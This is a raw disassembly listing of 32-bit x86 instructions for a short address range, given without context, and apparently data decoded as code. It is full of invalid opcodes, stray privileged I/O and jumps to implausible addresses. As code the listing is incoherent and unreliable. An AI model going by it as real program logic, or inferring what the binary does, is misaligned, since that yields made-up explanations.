  4098a1:	mov    edx,0x9d038f45
  4098a6:	out    0x18,eax
  4098a8:	(bad)  
  4098aa:	inc    DWORD PTR [eax+0x35]
  4098ad:	jne    0x4098ae
  4098af:	cs stc 
  4098b1:	fwait
  4098b2:	adc    esp,DWORD PTR [esi]
  4098b4:	jg     0x4098bf
  4098b6:	call   0xff525610
  4098bb:	(bad)  
  4098bc:	in     al,0x1f
  4098be:	cmp    ebp,eax
  4098c0:	repz push es
  4098c2:	mov    ebp,DWORD PTR [edi+ebx*1+0x76e93884]
  4098c9:	or     ch,cl
  4098cb:	mov    edi,0x260006f2
  4098d0:	push   edi
  4098d1:	or     eax,0x6f3e900
  4098d6:	lea    esp,[eax+eax*1]
	...
  4098e9:	add    al,ch
  4098eb:	mov    dh,0xfe
  4098ed:	pop    esp
  4098ee:	add    BYTE PTR [eax],dl
  4098f0:	jne    0x4098eb
  4098f2:	fcomp  DWORD PTR [ebx+0x1105d107]
  4098f8:	(bad)  
  4098f9:	mov    esi,0x34830f74
  4098fe:	clc    
  4098ff:	push   es
  409900:	je     0x40990c
  409902:	test   ch,al
  409904:	cmp    ebp,DWORD PTR [eax]
  409906:	hlt    
  409907:	pcmpeqw mm3,QWORD PTR [ebp-0x169482e5]
  40990e:	repz sti 
  409910:	mov    edi,0x4a9eef14
  409915:	lds    esi,FWORD PTR [edx-0xb01f0]
  40991b:	push   ds
  40991c:	jns    0x409920
  40991e:	hlt    
  40991f:	push   es
  409920:	mov    DWORD PTR [eax+ecx*8],esp
  409923:	sbb    eax,DWORD PTR [edi]
  409925:	cs dec esi
  409927:	sbb    al,0x0
  409929:	jmp    0xd4c3a021
  40992e:	xlat   BYTE PTR ds:[ebx]
  40992f:	push   es
  409930:	je     0x409923
  409932:	dec    ebx
  409933:	pop    es
  409934:	add    BYTE PTR [eax],al
  409936:	(bad)  
  409937:	lods   eax,DWORD PTR ds:[esi]
  409938:	(bad)  
  409939:	jne    0x409990
  40993b:	fadd   QWORD PTR [esi-0x6b]
  40993e:	es out dx,eax
  409940:	(bad)  
  409941:	jne    0x409948
  409943:	out    dx,eax
  409944:	je     0x409952
  409946:	loope  0x4098d5
  409948:	xchg   esp,eax
  409949:	jmp    esi
  40994b:	fmul   QWORD PTR [edx+0x0]
	...
  40995d:	add    BYTE PTR [eax],al
  40995f:	add    BYTE PTR [ecx+0x4],cl
  409962:	mov    eax,DWORD PTR [ebp+0x3d]
  409965:	mov    edi,DWORD PTR [eax]
  409967:	add    BYTE PTR [eax+edx*1+0x41986e8],ch
  40996e:	add    bh,al
  409970:	dec    esp
  409971:	in     al,dx
  409972:	(bad)  
  409973:	dec    DWORD PTR [ecx]
  409975:	add    al,0xc7
  409977:	inc    ebp
  409978:	sub    eax,0x1900000b
  40997d:	rol    DWORD PTR [eax+esi*8+0x9],1
  409981:	add    al,0x0
  409983:	add    BYTE PTR [ebp+eax*2+0x466450ef],dl
  40998a:	repz push eax
  40998c:	push   esp
  40998d:	inc    esi
  40998e:	not    DWORD PTR [eax-0x5a]
  409991:	jne    0x4099a6
  409993:	call   FWORD PTR [ebx+eax*1]
  409996:	call   0xff38317c
  40999b:	and    esp,0xffffffde
  40999e:	push   DWORD PTR [ebx-0x66]
  4099a1:	test   BYTE PTR [ebp-0x8],bh
  4099a4:	leave  
  4099a5:	jg     0x4099d3
  4099a7:	xor    esp,0xfffffff6
  4099aa:	push   DWORD PTR [edi+ecx*4-0x7c]
  4099ae:	jge    0x4099a0
  4099b0:	mov    DWORD PTR [edi+0x20],edi
  4099b3:	call   FWORD PTR [ebx+ebp*8-0x247a8a02]
  4099ba:	cmp    al,0x95
  4099bc:	es clc 
  4099be:	(bad)  
  4099bf:	jne    0x4099b1
  4099c1:	mov    cl,0x16
  4099c3:	jne    0x4099c5
	...
  4099d5:	add    ah,ah
  4099d7:	(bad)
  4099da:	outs   dx,DWORD PTR ds:[esi]
  4099db:	enter  0x7516,0x60
  4099df:	rcl    BYTE PTR [eax+0x7100480b],1
  4099e5:	call   DWORD PTR [edi-0x20]
  4099e8:	nop
  4099e9:	neg    DWORD PTR [eax+0x31]
  4099ec:	jnp    0x4099ed
  4099ee:	inc    edi
  4099ef:	lock nop
  4099f1:	repz dec eax
  4099f3:	dec    ecx
  4099f4:	jnp    0x4099f5
  4099f6:	aaa    
  4099f7:	add    BYTE PTR [ecx+0x7b4118ef],dl
  4099fd:	jmp    DWORD PTR [edi]
  4099ff:	pusha  
  409a00:	or     bh,bh
  409a02:	out    dx,eax
  409a03:	mov    ds:0x2017fea8,al
  409a08:	cmp    BYTE PTR [ebp+0x1c],0x1d
  409a0c:	(bad)  
  409a0d:	sbb    eax,0x75161d9a
  409a12:	in     al,dx
  409a13:	inc    ebp
  409a14:	outs   dx,DWORD PTR ds:[esi]
  409a15:	xchg   esp,eax
  409a16:	idiv   DWORD PTR [edi]
  409a18:	test   eax,0x7cbeeff
  409a1d:	call   0xff564e9c
  409a22:	dec    edx
  409a23:	and    BYTE PTR [esi],dl
  409a25:	jne    0x409a0b
  409a27:	inc    edi
  409a28:	adc    DWORD PTR [edi+ecx*8-0x3b8ae99b],0x78
  409a30:	es xchg edi,eax
  409a32:	mov    edi,0xbe0ac575
  409a37:	sub    eax,0xbd80
	...
  409a4c:	scas   al,BYTE PTR es:[edi]
  409a4d:	test   DWORD PTR [esi],edx
  409a4f:	pop    edi
  409a50:	inc    esi
  409a51:	push   edi
  409a52:	inc    ecx
  409a53:	adc    al,dh
  409a55:	jmp    0x561f:0x6473ec8a
  409a5c:	pop    DWORD PTR [edi]
  409a5e:	fmul   QWORD PTR [ebx]
  409a60:	cwde   
  409a61:	jbe    0x409ad1
  409a63:	push   ss
  409a64:	jg     0x4099e6
  409a66:	lods   al,BYTE PTR ds:[esi]
  409a67:	(bad)  
  409a69:	mov    WORD PTR [ebx+esi*8-0x1e],ss
  409a6d:	add    BYTE PTR [ecx-0x16f90ffc],al
  409a73:	mov    ch,0x28
  409a75:	dec    ecx
  409a76:	loope  0x409a7b
  409a78:	push   edi
  409a79:	xchg   esp,eax
  409a7a:	loopne 0x409aa7
  409a7c:	ins    DWORD PTR es:[edi],dx
  409a7d:	js     0x409aa5
  409a7f:	push   ss
  409a80:	das    
  409a81:	les    esp,FWORD PTR [eax]
  409a83:	add    al,0xf0
  409a85:	push   es
  409a86:	jmp    0xb94f4813
  409a8b:	push   ss
  409a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a8d:	(bad)  
  409a8e:	adc    dh,bl
  409a90:	or     DWORD PTR [esi],0xab58bfe
  409a96:	push   0xffffff98
  409a98:	pop    ds
  409a99:	pop    es
  409a9a:	jne    0x409aa3
  409a9c:	jae    0x409a2a
  409a9e:	in     al,0x2
  409aa0:	add    BYTE PTR [edx+ebp*2],0x97
  409aa4:	sti    
  409aa5:	add    al,0x5f
  409aa7:	or     bh,BYTE PTR [eax]
  409aa9:	or     cl,ch
  409aab:	add    esi,eax
  409aad:	lods   al,BYTE PTR ds:[esi]
  409aae:	scas   eax,DWORD PTR es:[edi]
  409aaf:	inc    edx
	...
  409ac0:	add    BYTE PTR [eax],al
  409ac2:	clc    
  409ac3:	push   es
  409ac4:	ins    BYTE PTR es:[edi],dx
  409ac5:	mov    edi,0x8fb5b6e7
  409aca:	out    dx,eax
  409acb:	push   ds
  409acc:	lods   eax,DWORD PTR ds:[esi]
  409acd:	jae    0x409a9e
  409acf:	or     eax,0x6bf976a
  409ad4:	adc    eax,0x1d46eb00
  409ad9:	or     bh,BYTE PTR [eax+0x7]
  409adc:	jmp    0xafed8ae4
  409ae1:	inc    edx
  409ae2:	clc    
  409ae3:	push   es
  409ae4:	push   0xffffff97
  409ae6:	fwait
  409ae7:	add    eax,DWORD PTR [eax]
  409ae9:	sti    
  409aea:	pushf  
  409aeb:	jp     0x409b32
  409aed:	jno    0x409b33
  409aef:	lahf   
  409af0:	pop    ss
  409af1:	data16 ja 0x409af9
  409af4:	call   0xff4e9cba
  409af9:	fs aaa 
  409afb:	adc    eax,0x57f4e50
  409b00:	call   0xff4e7e36
  409b05:	jo     0x409aa6
  409b07:	sub    ebx,ebp
  409b09:	aam    0x6e
  409b0b:	ret    
  409b0c:	neg    DWORD PTR [ecx+0x110793e4]
  409b12:	mov    ch,0x77
  409b14:	call   FWORD PTR [esi]
  409b16:	imul   eax,ebx,0xffffffe3
  409b19:	fs ja  0x409b31
  409b1c:	push   eax
  409b1d:	sub    DWORD PTR [edi],0xc
  409b20:	jne    0x409b13
  409b22:	fneni(8087 only) 
  409b24:	xchg   ecx,eax
  409b25:	inc    BYTE PTR [eax]
	...
  409b37:	add    BYTE PTR [esp+edi*2],al
  409b3a:	inc    ebp
  409b3b:	icebp  
  409b3c:	arpl   WORD PTR [esi*2-0x5c6241f],cx
  409b43:	out    0xdc,al
  409b45:	mov    DWORD PTR [ebp-0x3b],edi
  409b48:	repnz xchg ebx,eax
  409b4a:	sbb    eax,0x50153664
  409b4f:	into   
  409b50:	jle    0x409b62
  409b52:	(bad)  
  409b53:	cmp    al,0xf8
  409b55:	or     esi,DWORD PTR [ebp-0xf]
  409b58:	or     ebx,DWORD PTR [ebp-0x3]
  409b5b:	mov    dh,0xfc
  409b5d:	jns    0x409ba4
  409b5f:	mov    cl,0x83
  409b61:	or     eax,0x5c1bf175
  409b66:	cli    
  409b67:	sahf   
  409b68:	in     al,0x87
  409b6a:	jge    0x409afd
  409b6c:	repz xchg ecx,eax
  409b6e:	or     DWORD PTR [ecx-0xd],edx
  409b71:	push   es
  409b72:	add    BYTE PTR [eax],al
  409b74:	cdq    
  409b75:	push   edx
  409b76:	enter  0xa1c2,0x8
  409b7a:	lea    eax,[ebp+0x21]
  409b7d:	pop    eax
  409b7e:	(bad)  
  409b7f:	jne    0x409b9e
  409b81:	repz je 0x409b90
  409b84:	push   cs
  409b85:	jge    0x409b8e
  409b87:	call   0x3f9095
  409b8c:	or     dh,BYTE PTR [ebp-0x9]
  409b8f:	add    BYTE PTR [esi+edi*8-0x49],al
  409b93:	add    BYTE PTR [ecx+0x8],bl
  409b96:	add    BYTE PTR [esi+0x20],bl
  409b99:	mov    BYTE PTR [edi],0x0
	...
  409bac:	add    BYTE PTR [eax],al
  409bae:	int3   
  409baf:	dec    esp
  409bb0:	not    DWORD PTR [eax+0x1e]
  409bb3:	jge    0x409bbc
  409bb5:	call   0x3f350b
  409bba:	ret    0xe8f7
  409bbd:	sti    
  409bbe:	dec    ecx
  409bbf:	or     BYTE PTR [eax],al
  409bc1:	inc    DWORD PTR [eax+eax*1-0xd341818]
  409bc8:	(bad)  
  409bc9:	cmp    edx,DWORD PTR [esp+edi*8+0x74]
  409bcd:	add    eax,0xfffffaf0
  409bd2:	sbb    DWORD PTR [edi+0x7217fc7d],eax
  409bd8:	and    ecx,DWORD PTR [ebp-0xb0052c]
  409bde:	xchg   esp,eax
  409bdf:	or     ah,bh
  409be1:	or     eax,0x8dfef868
  409be6:	adc    al,0xfb
  409be8:	dec    edi
  409be9:	jmp    DWORD PTR [ebx+ecx*1]
  409bec:	out    0x3a,eax
  409bee:	mov    ds:0x148dfef7,eax
  409bf3:	sti    
  409bf4:	dec    edi
  409bf5:	jmp    esp
  409bf7:	or     ah,bh
  409bf9:	cs xchg ebx,eax
  409bfb:	idiv   esi
  409bfd:	(bad)  
  409bfe:	lock fimul DWORD PTR [ebx]
  409c01:	push   eax
  409c02:	scas   eax,DWORD PTR es:[edi]
  409c03:	repnz sti 
  409c05:	out    0xc3,eax
  409c07:	mov    BYTE PTR [ebx],dl
  409c09:	jmp    FWORD PTR [ecx-0x1e]
  409c0c:	adc    ecx,DWORD PTR [ebp-0x14c69d3]
	...
  409c22:	add    BYTE PTR [eax],al
  409c24:	add    eax,0x8bc41b26
  409c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c2a:	adc    cl,BYTE PTR [ecx+0x4580ba35]
  409c30:	js     0x409c7f
  409c32:	adc    dh,BYTE PTR [ebp-0x8]
  409c35:	lds    ebx,FWORD PTR [eax-0x5]
  409c38:	les    edi,FWORD PTR [si+0x45]
  409c3c:	dec    eax
  409c3d:	mov    al,ds:0x49f0ef90
  409c42:	xchg   esi,eax
  409c43:	or     ch,0xc9
  409c46:	add    esi,DWORD PTR [ebp+edx*8-0x60]
  409c4a:	nop
  409c4b:	out    0xf0,eax
  409c4d:	jno    0x409bf9
  409c4f:	xor    BYTE PTR [ebp-0x6e8bfc0b],0x85
  409c56:	mov    bh,0x3b
  409c58:	mov    cl,0x1d
  409c5a:	adc    dh,BYTE PTR [ebp+0x20]
  409c5d:	cmc    
  409c5e:	dec    esi
  409c5f:	push   0xbffe1df0
  409c64:	test   DWORD PTR [ebx],edi
  409c66:	fwait
  409c67:	inc    edx
  409c68:	(bad)  
  409c69:	fiadd  WORD PTR [ebx]
  409c6b:	inc    DWORD PTR [ebp-0x7755e4d3]
  409c71:	sbb    eax,0xb3b00b03
  409c76:	add    BYTE PTR [eax+0x3b],ch
  409c79:	add    al,0xc5
  409c7b:	(bad)  
  409c7c:	(bad)  
  409c7e:	adc    ebp,eax
  409c80:	jns    0x409c4a
  409c82:	add    eax,DWORD PTR [eax]
  409c84:	sti    
  409c85:	pop    edi
  409c86:	xchg   edi,eax
  409c87:	sub    eax,0x0
	...
  409c98:	add    BYTE PTR [eax],al
  409c9a:	pop    eax
  409c9b:	pop    es
  409c9c:	jmp    0x9e8a6ba4
  409ca1:	cwde   
  409ca2:	jmp    0x409cc2
  409ca4:	sbb    al,0x76
  409ca6:	scas   eax,DWORD PTR es:[edi]
  409ca7:	or     cl,BYTE PTR [esi-0x3f56868]
  409cad:	call   DWORD PTR [edi-0x68eda4c5]
  409cb3:	or     bh,ah
  409cb5:	pop    ds
  409cb6:	(bad)  
  409cb7:	xchg   esp,eax
  409cb8:	fcomp  QWORD PTR [ebx]
  409cba:	mov    cl,0x75
  409cbc:	data16 adc bh,BYTE PTR [edi-0x6c]
  409cc0:	push   eax
  409cc1:	adc    bh,ch
  409cc3:	cli    
  409cc4:	inc    eax
  409cc5:	pop    ecx
  409cc6:	or     BYTE PTR [edx],0x4e
  409cc9:	adc    bl,ch
  409ccb:	push   ss
  409ccc:	push   ecx
  409ccd:	inc    esi
  409cce:	test   DWORD PTR [edx],ecx
  409cd0:	ds adc bl,ch
  409cd3:	sbb    al,BYTE PTR [ecx+0x4e]
  409cd6:	or     ch,BYTE PTR gs:[esi]
  409cd9:	adc    bh,BYTE PTR [ebp+0x6556111e]
  409cdf:	or     bl,BYTE PTR [esi]
  409ce1:	shl    DWORD PTR [edx-0x74],0x10
  409ce5:	add    esp,DWORD PTR [esi+edi*8-0x7c08e61f]
  409cec:	(bad)  
  409ced:	adc    BYTE PTR [edi],bl
  409cef:	or     dh,BYTE PTR [edx-0x38]
  409cf2:	pop    ds
  409cf3:	test   eax,0x6f8451f
  409cf8:	xchg   esp,eax
  409cf9:	jle    0x409d0f
  409cfb:	xchg   BYTE PTR [ebp+0x10],ch
	...
  409d0d:	add    BYTE PTR [eax],al
  409d0f:	add    bh,bh
  409d11:	xchg   ebx,eax
  409d12:	in     al,dx
  409d13:	sbb    ebp,DWORD PTR [ebx-0x4ee29b2]
  409d19:	inc    esi
  409d1a:	push   esp
  409d1b:	shl    DWORD PTR [ebx+eax*8-0x3c],1
  409d1f:	mov    ah,0xd7
  409d21:	aaa    
  409d22:	ins    DWORD PTR es:[edi],dx
  409d23:	adc    edi,edx
  409d25:	or     DWORD PTR [eax],eax
  409d27:	cmp    al,0xe0
  409d29:	or     DWORD PTR [ebp-0x23],esi
  409d2c:	jmp    0x409d7f
  409d2e:	mov    fs,WORD PTR [esi+0x15bffde1]
  409d34:	ror    DWORD PTR [eax],0x75
  409d37:	loope  0x409d39
  409d39:	xchg   esp,eax
  409d3a:	sti    
  409d3b:	cmp    DWORD PTR [ecx+0xb],0x499d86ff
  409d42:	jne    0x409d1d
  409d44:	jnp    0x409d4f
  409d46:	jbe    0xddb5a76e
  409d4c:	loopne 0x409ce1
  409d4e:	pop    es
  409d4f:	push   ecx
  409d50:	adc    dl,BYTE PTR [edx-0x1]
  409d53:	pop    esi
  409d54:	loope  0x409ce9
  409d56:	sti    
  409d57:	inc    ecx
  409d58:	mov    esp,0x2b4eff7a
  409d5d:	inc    ebp
  409d5e:	or     cl,ch
  409d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d61:	jl     0x409d4f
  409d63:	push   0x36fe52a8
  409d68:	loope  0x409dab
  409d6a:	test   DWORD PTR [ecx-0x1e],esi
  409d6d:	or     edi,edi
  409d6f:	jmp    0x7240a467
	...
  409d84:	add    BYTE PTR [eax],al
  409d86:	das    
  409d87:	std    
  409d88:	or     ch,BYTE PTR [ecx]
  409d8a:	mov    BYTE PTR [edx],al
  409d8c:	adc    cl,0xf3
  409d8f:	xchg   ebx,eax
  409d90:	add    al,0x10
  409d92:	arpl   WORD PTR [esi],ax
  409d94:	add    cl,ch
  409d96:	add    BYTE PTR [ebx+ecx*1-0x990fff],dl
  409d9d:	out    dx,al
  409d9e:	add    al,0x49
  409da0:	jne    0x409d98
  409da2:	pop    ebx
  409da3:	cmp    BYTE PTR [eax+ebp*1],ch
  409da6:	in     al,dx
  409da7:	or     DWORD PTR [ebp-0x1b],esi
  409daa:	or     ebx,DWORD PTR [esi-0x68]
  409dad:	into   
  409dae:	add    BYTE PTR [ecx*1+0x2bcf4100],bl
  409db5:	inc    ecx
  409db6:	leave  
  409db7:	div    DWORD PTR [esp+ecx*1-0x4f]
  409dbb:	call   0xb884:0x8d96ff97
  409dc2:	xchg   edi,eax
  409dc3:	idiv   esi
  409dc5:	push   0x597
  409dca:	adc    al,0x81
  409dcc:	ret    0x76fe
  409dcf:	test   DWORD PTR [edi-0x18],0xfffe91bb
  409dd6:	add    al,0x81
  409dd8:	ret    0x6fe
  409ddb:	test   DWORD PTR [edi-0x1],0xfffdbbbc
  409de2:	push   ss
  409de3:	in     al,dx
  409de4:	dec    ebp
  409de5:	mov    WORD PTR [ecx+ecx*4],ax
  409de9:	test   DWORD PTR [eax],eax
	...
  409dfb:	add    BYTE PTR [ebp-0x6600010a],al
  409e01:	pop    es
  409e02:	test   bl,dh
  409e04:	dec    ecx
  409e05:	add    al,0x0
  409e07:	lea    edi,[ecx+eax*8-0x10f90003]
  409e0e:	add    DWORD PTR [eax],edx
  409e10:	pop    ecx
  409e11:	add    al,0x0
  409e13:	je     0x409da9
  409e15:	mov    DWORD PTR [ecx+0x2c],eax
  409e18:	jns    0x409e86
  409e1a:	leave  
  409e1b:	sub    al,0x58
  409e1d:	add    al,0xe8
  409e1f:	sub    ebp,DWORD PTR [edi+0x4]
  409e22:	add    BYTE PTR [ebx],cl
  409e24:	leave  
  409e25:	jo     0x409e2b
  409e27:	jmp    0x40a1ec
  409e2c:	xchg   esp,eax
  409e2d:	nop
  409e2e:	sar    esi,0x16
  409e31:	clc    
  409e32:	mov    WORD PTR [edx-0x1b],es
  409e35:	push   edx
  409e36:	addr16 int3 
  409e38:	in     eax,0x41
  409e3a:	jmp    edi
  409e3c:	lock pop ds
  409e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e3f:	jmp    edi
  409e41:	and    al,0x43
  409e43:	jne    0x409e3a
  409e45:	add    BYTE PTR ss:[eax],0xf0
  409e49:	sbb    eax,0x45fc750e
  409e4e:	mov    al,ds:0xfb58c79e
  409e53:	mov    edi,0xdd9b1145
  409e58:	or     bh,bl
  409e5a:	add    edi,edi
  409e5c:	and    eax,0x91b22
	...
  409e71:	add    BYTE PTR [eax-0x1514f088],cl
  409e77:	repz add edi,edi
  409e7a:	sbb    eax,0x67fd1b1a
  409e7f:	nop
  409e80:	push   cs
  409e81:	lea    ebx,[ebp+0x5b]
  409e84:	push   cs
  409e85:	(bad)  
  409e86:	jg     0x409e1a
  409e88:	mov    cl,0x2b
  409e8a:	and    cl,BYTE PTR [esi+0x1b]
  409e8d:	inc    ecx
  409e8e:	mov    BYTE PTR [eax+0x3267500e],dh
  409e94:	repz dec edi
  409e96:	pop    edi
  409e97:	dec    edx
  409e98:	sti    
  409e99:	out    0x5a,eax
  409e9b:	(bad)  
  409e9c:	push   cs
  409e9d:	call   FWORD PTR [eax+0x11]
  409ea0:	ja     0x409ea1
  409ea2:	inc    edi
  409ea3:	(bad)
  409ea7:	xor    DWORD PTR [ebp+eax*4+0x7c],edi
  409eab:	out    0xe,eax
  409ead:	jmp    FWORD PTR [edi]
  409eaf:	push   0xfffffff3
  409eb1:	(bad)  
  409eb2:	pop    ebp
  409eb3:	mov    cl,0xd
  409eb5:	call   FWORD PTR [edi]
  409eb7:	cmc    
  409eb8:	dec    esi
  409eb9:	lock sbb ax,0xbffa
  409ebe:	test   BYTE PTR [ebp-0x65],al
  409ec1:	fstp   st(0)
  409ec3:	pop    esi
  409ec4:	add    edi,edi
  409ec6:	test   DWORD PTR [esi],eax
  409ec8:	cmc    
  409ec9:	sbb    eax,DWORD PTR [ecx+0x6f]
  409ecc:	fimul  WORD PTR [esi]
  409ece:	out    dx,eax
  409ecf:	mov    esp,0x6e70d9c
  409ed4:	cmp    DWORD PTR [eax+eax*1],ebx
	...
  409ee7:	add    cl,bl
  409ee9:	sahf   
  409eea:	lds    ecx,FWORD PTR [esi]
  409eec:	inc    eax
  409eed:	push   edi
  409eee:	mov    esi,0x48eef798
  409ef3:	push   cs
  409ef4:	mov    DWORD PTR [esi],0x66316c1
  409efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409efb:	sub    BYTE PTR [ebp-0x37],0x9e
  409eff:	push   cs
  409f00:	scas   eax,DWORD PTR es:[edi]
  409f01:	push   edi
  409f02:	xchg   esi,eax
  409f03:	pop    eax
  409f04:	fs add eax,0x74880e8e
  409f0a:	or     al,0x4
  409f0c:	lock mov ebp,DWORD PTR [eax+0x761f74fe]
  409f13:	push   cs
  409f14:	xchg   DWORD PTR [esi],eax
  409f16:	xor    al,0x4f
  409f18:	jle    0x409f20
  409f1a:	sbb    dx,WORD PTR [eax]
  409f1d:	ins    BYTE PTR es:[edi],dx
  409f1e:	jmp    0x90fd0e26
  409f23:	or     eax,0x46410667
  409f28:	add    DWORD PTR [esi],0x46
  409f2b:	cmp    al,0x32
  409f2d:	adc    ebp,ecx
  409f2f:	mov    eax,0x4767f37a
  409f34:	add    BYTE PTR ds:0x8c370e2e,0x60
  409f3b:	or     eax,0x3e90637
  409f40:	lock push es
  409f42:	(bad)  
  409f43:	enter  0x11fb,0x29
  409f47:	xchg   edi,eax
  409f48:	hlt    
  409f49:	xchg   al,al
  409f4b:	add    eax,DWORD PTR [eax]
	...
  409f5d:	add    BYTE PTR [ebp-0xf03eff5],bl
  409f63:	push   es
  409f64:	add    cl,ch
  409f66:	imul   edx,ebp,0x2b
  409f69:	test   al,0xf3
  409f6b:	add    eax,0x37dbf575
  409f70:	xchg   edi,eax
  409f71:	fdivp  st(5),st
  409f73:	pop    DWORD PTR [ecx+edx*4+0x41ff05f6]
  409f7a:	scas   al,BYTE PTR es:[edi]
  409f7b:	push   es
  409f7c:	add    cl,ch
  409f7e:	push   esi
  409f7f:	mov    ecx,es
  409f81:	mov    edi,0xc15005fd
  409f86:	sub    ebx,DWORD PTR [edx-0x73c05102]
  409f8c:	shl    DWORD PTR [edi-0x61affa1b],0x47
  409f93:	mov    edi,0xeef596fd
  409f98:	in     al,0x5
  409f9a:	hlt    
  409f9b:	push   es
  409f9c:	mov    DWORD PTR [eax+eax*2+0x5],ebp
  409fa0:	(bad)  
  409fa1:	jle    0x409f57
  409fa3:	adc    al,0x84
  409fa5:	scas   eax,DWORD PTR es:[edi]
  409fa6:	in     al,dx
  409fa7:	push   es
  409fa8:	add    BYTE PTR [edi+eax*1-0x37],bl
  409fac:	std    
  409fad:	in     ax,0xfd
  409fb0:	add    ecx,edi
  409fb2:	repz push es
  409fb4:	add    dh,ah
  409fb6:	outs   dx,DWORD PTR ds:[esi]
  409fb7:	xchg   ebp,eax
  409fb8:	(bad)  
  409fb9:	call   0x2bd533b1
  409fbe:	out    0x5,al
  409fc0:	jmp    FWORD PTR [eax+eax*1+0x0]
	...
  409fd4:	xor    dh,BYTE PTR [ecx]
  409fd6:	push   eax
  409fd7:	ror    DWORD PTR [ecx],0x33
  409fda:	inc    ecx
  409fdb:	jmp    0xe9a45ebb
  409fe0:	repz adc eax,eax
  409fe3:	xchg   esp,eax
  409fe4:	icebp  
  409fe5:	icebp  
  409fe6:	je     0x40a04c
  409fe8:	lahf   
  409fe9:	enter  0xefd,0xed
  409fed:	xchg   ebx,eax
  409fee:	inc    ecx
  409fef:	add    BYTE PTR ds:0x3dcc66b9,bh
  409ff5:	enter  0xe7fe,0x9f
  409ff9:	scas   al,BYTE PTR es:[edi]
  409ffa:	(bad)  
  409ffb:	call   DWORD PTR [edx]
  409ffd:	dec    ecx
  409ffe:	jne    0x40a002
  40a000:	and    ch,BYTE PTR [esi+0x129b958b]
  40a006:	(bad)  
  40a007:	dec    DWORD PTR [esi+eax*8+0x2a]
  40a00b:	mov    DWORD PTR [esp+ebx*2-0x2],edx
  40a00f:	jmp    FWORD PTR [esi+0x1828dca0]
  40a015:	or     edi,edi
  40a017:	jne    0x409fe6
  40a019:	and    BYTE PTR [ecx-0xec716a],bl
  40a01f:	mov    ch,0x15
  40a021:	adc    bh,bh
  40a023:	(bad)  
  40a024:	jmp    0x7ed7814b
  40a029:	adc    ecx,DWORD PTR [ecx-0xedc67b]
  40a02f:	(bad)  
  40a030:	stc    
  40a031:	mov    ds:0xad83c59,al
  40a036:	push   DWORD PTR [ebp+0x0]
	...
  40a048:	add    BYTE PTR [eax],al
  40a04a:	leave  
  40a04b:	adc    edi,edi
  40a04d:	push   DWORD PTR [ecx-0x69]
  40a050:	arpl   WORD PTR [eax],ax
  40a052:	mov    edi,edi
  40a054:	mov    esi,0x5fa06a74
  40a059:	cmp    al,0x98
  40a05b:	or     bh,bh
  40a05d:	mov    ch,0x79
  40a05f:	adc    bh,bh
  40a061:	jmp    FWORD PTR [esi+0x30e8069c]
  40a067:	adc    eax,0x4eb1ffff
  40a06c:	xchg   edx,eax
  40a06d:	dec    DWORD PTR [esi]
  40a06f:	test   DWORD PTR [ebp-0xecf03e],eax
  40a075:	push   eax
  40a076:	push   cs
  40a077:	pop    ebp
  40a078:	mov    esp,0xc1cf0fe
  40a07d:	call   0x432a63
  40a082:	ins    DWORD PTR es:[edi],dx
  40a083:	cs cld 
  40a085:	test   BYTE PTR [ebp+0x7ff0b04],dh
  40a08b:	inc    ebx
  40a08c:	dec    edi
  40a08d:	(bad)  
  40a08e:	push   esp
  40a090:	sbb    DWORD PTR [esp+ecx*4],esp
  40a093:	in     eax,dx
  40a094:	add    bh,bh
  40a096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a098:	or     edi,edi
  40a09a:	out    0xc5,eax
  40a09c:	jle    0x40a030
  40a09e:	(bad)  
  40a0a0:	cmp    al,0xc2
  40a0a2:	call   0xdccb5094
  40a0a7:	les    edx,FWORD PTR [eax+0x71a8d80b]
  40a0ad:	inc    DWORD PTR [eax]
	...
  40a0bf:	add    BYTE PTR [edi-0x188bbd18],bh
  40a0c5:	cmp    eax,0xf625feb4
  40a0ca:	sbb    ch,BYTE PTR [ebx-0x17f5635a]
  40a0d0:	or     DWORD PTR [eax-0x505600f5],eax
  40a0d6:	sti    
  40a0d7:	jmp    DWORD PTR [ecx+edi*2]
  40a0da:	sbb    BYTE PTR [ebx-0x618654],al
  40a0e0:	or     edi,ecx
  40a0e2:	or     DWORD PTR [ebp-0x18],esi
  40a0e5:	push   ebp
  40a0e6:	jg     0x40a077
  40a0e8:	outs   dx,DWORD PTR ds:[esi]
  40a0e9:	fs jge 0x40a131
  40a0ec:	fs (bad) 
  40a0ee:	in     al,dx
  40a0ef:	(bad)  
  40a0f0:	in     eax,0xe5
  40a0f2:	sbb    bh,BYTE PTR [edi+0x6a0b4c57]
  40a0f8:	adc    eax,DWORD PTR [ebp-0x6f]
  40a0fb:	pop    es
  40a0fc:	pop    eax
  40a0fd:	or     BYTE PTR [ebx],0xff
  40a100:	aas    
  40a101:	(bad)  
  40a102:	out    0xfe,al
  40a104:	mov    ebp,0x5b1bf106
  40a109:	add    ebx,DWORD PTR [esi]
  40a10b:	or     ebx,DWORD PTR [edx-0x23797efa]
  40a111:	inc    ebp
  40a112:	jmp    0xa8832bb2
  40a117:	add    ecx,DWORD PTR [edi]
  40a119:	cmp    DWORD PTR [esp+ebx*8-0x28fef950],ecx
  40a120:	fs add ebp,esi
  40a123:	inc    BYTE PTR [eax]
	...
  40a135:	add    BYTE PTR [edi],dh
  40a137:	jp     0x40a136
  40a139:	mov    bl,0x57
  40a13b:	push   0x52e7c51d
  40a140:	(bad)  
  40a141:	nop
  40a142:	imul   esi
  40a144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a145:	pop    es
  40a146:	xlat   BYTE PTR ds:[ebx]
  40a147:	add    dl,cl
  40a149:	push   es
  40a14a:	bound  eax,QWORD PTR [edx]
  40a14c:	mov    esi,0x5a6ac79d
  40a151:	(bad)  
  40a152:	xor    BYTE PTR [edi],al
  40a154:	inc    ecx
  40a155:	lahf   
  40a156:	sti    
  40a157:	inc    edi
  40a158:	jmp    0xd0b48667
  40a15d:	les    esp,FWORD PTR [edi-0x608f1316]
  40a163:	add    ah,dl
  40a165:	inc    ebx
  40a166:	sbb    al,0x1b
  40a168:	sbb    DWORD PTR [eax+edx*1+0x20042843],ebx
  40a16f:	add    bh,ah
  40a171:	sti    
